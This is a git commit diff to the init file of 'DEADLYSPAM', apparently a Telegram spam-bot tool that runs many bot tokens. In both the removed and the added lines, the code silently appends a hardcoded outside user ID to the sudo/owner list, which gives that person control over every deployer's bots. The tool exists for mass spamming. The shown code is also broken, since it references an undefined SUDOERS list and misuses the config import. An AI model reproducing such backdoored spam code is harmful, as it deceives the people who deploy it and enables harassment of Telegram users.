31b364cd1478c589fce7a76fd6a97baeb51c1bf7
BlazeOp <94062864+piroXpower@users.noreply.github.com>
2023-02-26 01:28:09 +0530

    Update __init__.py

--- DEADLYSPAM/__init__.py
+++ DEADLYSPAM/__init__.py
@@ -2,6 +2,7 @@
 import os
 import sys
 import random
+import config
 import asyncio
 import telethon.utils
 from telethon import TelegramClient, events
@@ -15,37 +16,10 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
                     level=logging.WARNING)
 
 #version
+deadlyversion = "v3.0.0"
 
-deadlyversion = "v0.3.1"
-
-#values
-API_ID = config("API_ID", default=None, cast=int)
-API_HASH = config("API_HASH", default=None)
-ALIVE_PIC = config("ALIVE_PIC", default=None)
-CMD_HNDLR = getenv("CMD_HNDLR", default="!")
-OWNER_NAME = getenv("OWNER_NAME", default=None)
-HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
-HEROKU_API_KEY = config("HEROKU_API_KEY", None)
-BOT_TOKEN = config("BOT_TOKEN", default=None)
-BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
-BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
-BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
-BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
-BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
-BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
-BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
-BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
-BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 5256676062 not in SUDO_USERS:
-    SUDO_USERS.append(5937170640)
-
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
-
-# Don't Mess with Codes !! 
-DATABASE_URL = config("DATABASE_URL", None)
-SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5937170640)
+SUDOERS.append(OWNER_ID)
+SUDOERS.append(5937170640)
 
 # Tokens
 
